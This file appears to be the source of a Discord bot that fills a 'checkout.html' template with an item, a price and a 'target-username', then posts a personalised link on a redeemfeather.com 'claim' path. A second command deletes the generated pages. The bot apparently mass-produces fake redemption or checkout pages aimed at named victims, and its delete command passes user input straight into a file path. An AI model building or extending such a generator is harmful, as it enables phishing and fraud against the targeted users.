const fs = require('fs')
const jquery = require('jquery');
const jsdom = require("jsdom");
const { JSDOM } = jsdom;
require('dotenv').config();
const { Client, IntentsBitField, ChannelSelectMenuBuilder, InteractionResponse, ChatInputCommandInteraction } = require("discord.js");
const { error } = require('console');
const { env } = require('process');
const { channel } = require('diagnostics_channel');
let fileName = crypto.randomUUID();




const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
    IntentsBitField.Flags.DirectMessages,
  ],
});

client.login(process.env.TOKEN);

client.on('ready', (c) => {
  console.log(`${c.user.tag} is online...`)
});


client.on('interactionCreate', (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'feather-create-code'){
    
fs.readFile('claim/checkout.html', 'utf8', (err, data) => {
      const Cosmetic = interaction.options.getString('item');
      const Price = interaction.options.getString('price');
      const TargetUsername = interaction.options.getString('target-username')
      const dom = new jsdom.JSDOM(data);
      const ItemElement = jquery(dom.window);
      const PriceElement = jquery(dom.window);
      const ReceiverElement = jquery(dom.window);
      

      ItemElement('.yusufshef').html(`${Cosmetic}`);
      PriceElement('.removedll').html(`${Price}`);
      ReceiverElement('.receiver2').html(`${TargetUsername}`);
      fs.writeFile(`claim/${fileName}.html`, dom.serialize(), { flag: "a" }, err => {
          console.log('done');
      });




      setTimeout(() => {
        interaction.reply({
          content: `A new link has been generated:\nCosmetic: ${ItemElement('.yusufshef').html()}\nTarget-User: ${ReceiverElement('.receiver2').html()}\nPrice: ${PriceElement('.removedll').html()}\nLink code: ${fileName}\nLink: http://redeemfeather.com/claim/${fileName}`,
          ephemeral: false,
        });
      }, 1000)

  });

  setTimeout(() => {
    process.exit();
  }, 2000)

  }
});

client.on('interactionCreate', (interaction) => {
if (!interaction.isChatInputCommand()) return;

if(interaction.commandName === 'feather-delete-code'){
  
  fs.unlinkSync(`claim/${interaction.options.getString('code')}.html`)
  interaction.reply(`${interaction.options.getString('code')} has been deleted`)

  setTimeout(() => {
    process.exit();
  }, 2000)
}
})


client.login(process.env.TOKEN);